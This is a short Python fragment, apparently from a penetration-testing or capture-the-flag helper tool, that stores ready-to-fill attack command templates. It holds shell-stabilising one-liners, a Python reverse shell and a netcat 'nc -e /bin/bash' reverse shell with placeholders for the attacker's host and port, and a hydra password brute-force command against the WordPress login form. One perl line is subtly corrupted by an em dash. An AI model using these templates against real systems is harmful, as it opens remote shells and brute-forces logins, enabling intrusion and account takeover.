
#tty
tty_python = "python3 -c 'import pty; pty.spawn(\"/bin/sh\")'"
tty_echo   = "echo os.system('/bin/bash')"
tty_perl   = "perl —e 'exec \"/bin/sh\";'"

#reverse shell
rs_python = "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
rs_netcat = "nc {} {} -e /bin/bash"

#hydra
hy_wordpress = "hydra -v -L {} -P {} {} http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'"
